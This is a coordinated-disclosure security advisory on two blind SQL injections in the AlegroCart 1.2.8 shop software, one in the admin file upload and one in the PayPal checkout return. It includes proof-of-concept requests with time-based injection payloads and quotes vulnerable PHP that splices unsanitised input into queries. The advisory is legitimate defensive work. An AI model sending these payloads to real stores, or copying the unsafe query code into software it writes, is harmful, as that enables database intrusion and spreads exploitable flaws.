@@ -1,0 +1,218 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    AlegroCart 1.2.8
+Fixed in:            Patch AC128_fix_17102015
+Path Link:           http://forum.alegrocart.com/download/file.php?id=1040
+Vendor Website:      http://alegrocart.com/
+Vulnerability Type:  SQL Injection
+Remote Exploitable:  Yes
+Reported to vendor:  09/29/2015
+Disclosed to public: 11/13/2015
+Release mode:        Coordinated release
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+There is a blind SQL injection in the admin area of AlegroCart. Additionally,
+there is a blind SQL injection when a customer purchases a product. Because of
+a required interaction with PayPal, this injection is hard to exploit for an
+attacker.
+
+3. BLind SQL Injection (Admin)
+
+CVSS
+
+Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description
+
+When viewing the list of uploaded files - or images - , the function
+check_download is called. This function performs a database query with the
+unsanitized name of the file. Because of this, an attacker can upload a file
+containing SQL code in its name, which will be executed once files are listed.
+
+Note that a similar function - check_filename - is called when deleting a file,
+making it likely that this operation is vulnerable as well.
+
+Admin credentials are required to exploit this issue.
+
+Proof of Concept
+
+
+POST /ecommerce/AlegroCart_1.2.8-2/upload/admin2/?controller=download&action=insert HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: alegro=accept; admin_language=en; alegro_sid=96e1abd77b24dd6f820b82eb32f2bd04_36822a89462da91b6ad8c600a468b669; currency=CAD; catalog_language=en; __atuvc=4%7C37
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------16690383031191084421650661794
+Content-Length: 865
+
+-----------------------------16690383031191084421650661794
+Content-Disposition: form-data; name="language[1][name]"
+
+test
+-----------------------------16690383031191084421650661794
+Content-Disposition: form-data; name="download"; filename="image.jpg' AND IF(SUBSTRING(version(), 1, 1)='5',BENCHMARK(100000000,ENCODE('MSG','by 5 seconds')),null) -- -"
+Content-Type: image/jpeg
+
+img
+
+-----------------------------16690383031191084421650661794
+Content-Disposition: form-data; name="mask"
+
+11953405959037.jpg
+-----------------------------16690383031191084421650661794
+Content-Disposition: form-data; name="remaining"
+
+1
+-----------------------------16690383031191084421650661794
+Content-Disposition: form-data; name="dc8bd9802df2ba1fd321b32bf73c62c4"
+
+f396df6c76265de943be163e9b65878a
+-----------------------------16690383031191084421650661794--
+
+
+Visiting
+http://localhost/ecommerce/AlegroCart_1.2.8-2/upload/admin2/?controller=download
+will trigger the injected code.
+
+Code
+
+
+/upload/admin2/model/products/model_admin_download.php
+function check_download($filename){
+        $result = $this->database->getRow("select * from download where filename = '".$filename."'");
+        return $result;
+}
+
+function check_filename($filename){
+        $results = $this->database->getRows("select filename from download where filename = '" . $filename . "'");
+        return $results;
+}
+
+/upload/admin2/controller/download.php
+function checkFiles() {
+        $files=glob(DIR_DOWNLOAD.'*.*');
+        if (!$files) { return; }
+        foreach ($files as $file) {
+                $pattern='/\.('.implode('|',$this->prohibited_types).')$/';
+                $filename=basename($file);
+                if (!preg_match($pattern,$file) && $this->validate->strlen($filename,1,128)) {
+                        $result = $this->modelDownload->check_download($filename);
+                        if (!$result) { $this->init($filename); }
+                }
+        }
+}
+
+4. BLind SQL Injection (Customer)
+
+CVSS
+
+Medium 5.1 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description
+
+There is an SQL Injection when using Paypal as a payment method during
+checkout.
+
+Please note that this injection requires that a successful interaction with
+Paypal took place. For test purposes, we commented out the parts of the code
+that actually perform this interaction with Paypal.
+
+Proof of Concept
+
+
+1. Register a User
+2. Buy an item, using PayPal as payment method; stop at step "Checkout Confirmation"
+3. Visit this link to trigger the injection: http://localhost/ecommerce/AlegroCart_1.2.8-2/upload/?controller=checkout_process&method=return&tx=REQUEST_TOKEN&ref=INJECTION. Note that this requires a valid paypal tx token.
+
+The injection can be exploited blind:
+
+
+http://localhost/ecommerce/AlegroCart_1.2.8-2/upload/?controller=checkout_process&method=return&tx=REQUEST_TOKEN&ref=-1' AND IF(SUBSTRING(version(), 1, 1)='5',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null) %23)
+
+However, this is rather unpractical, especially considering the need for a
+valid PayPal token for each request.
+
+It is also possible with this injection to inject into an UPDATE statement in
+update_order_status_paidunconfirmed. The problem here is that it is difficult
+to create an injection that exploits the UPDATE statement, but also results in
+an order_id being returned by the previous SELECT statement.
+
+It may also be possible to use the order_id that can be controlled via the
+SELECT statement to inject into the INSERT statement in update_order_history.
+But again, it is difficult to craft a query that does this, but also returns a
+valid result for the UPDATE query.
+
+Code
+
+
+/upload/catalog/extension/payment/paypal.php:
+function orderUpdate($status = 'final_order_status', $override = 0) {
+    //Find the paid_unconfirmed status id
+    $results = $this->getOrderStatusId('order_status_paid_unconfirmed');
+    $paidUnconfirmedStatusId = $results?$results:0;
+    //Find the final order status id
+    $results = $this->getOrderStatusId($status);
+    $finalStatusId = $results?$results:0;
+    $reference = $this->request->get('ref');
+    //Get Order Id
+        $res = $this->modelPayment->get_order_id($reference);
+    $order_id = $res['order_id'];
+    //Update order only if state in paid unconfirmed OR override is set
+    if ($order_id) {
+if ($override) {
+    // Update order status
+    $result = $this->modelPayment->update_order_status_override($finalStatusId,$reference);
+    // Update order_history
+    if ($result) {
+                                $this->modelPayment->update_order_history($order_id, $finalStatusId, 'override');
+    }
+} else {
+    // Update order status only if status is currently paid_unconfirmed
+                        $result = $this->modelPayment->update_order_status_paidunconfirmed($finalStatusId, $reference, $paidUnconfirmedStatusId);
+    // Update order_history
+    if ($result)  {
+                                $this->modelPayment->update_order_history($order_id, $finalStatusId, 'PDT/IPN');
+    }
+}
+    }
+}
+
+/upload/catalog/model/payment/model_payment.php:
+function get_order_id($reference){
+        $result = $this->database->getrow("select `order_id` from `order` where `reference` = '" . $reference . "'");
+        return $result;
+}
+
+function update_order_history($order_id, $finalStatusId,$comment){
+        $this->database->query("insert into `order_history` set `order_id` = '" . $order_id . "', `order_status_id` = '" . $finalStatusId . "', `date_added` = now(), `notify` = '0', `comment` = '" . $comment . "'");
+}
+
+function update_order_status_paidunconfirmed($finalStatusId, $reference, $paidUnconfirmedStatusId){
+        $result = $this->database->countAffected($this->database->query("update `order` set `order_status_id` = '" . $finalStatusId . "' where `reference` = '" . $reference . "' and order_status_id = '" . $paidUnconfirmedStatusId . "'"));
+        return $result;
+}
+
+5. Solution
+
+To mitigate this issue please apply this patch:
+
+http://forum.alegrocart.com/download/file.php?id=1040
+
+Please note that a newer version might already be available.
+
+6. Report Timeline
+
+09/29/2015 Informed Vendor about Issue
+17/10/2015 Vendor releases fix
+11/13/2015 Disclosed to public
+
+
+Blog Reference:
+http://blog.curesec.com/article/blog/AlegroCart-128-SQL-Injection-104.html
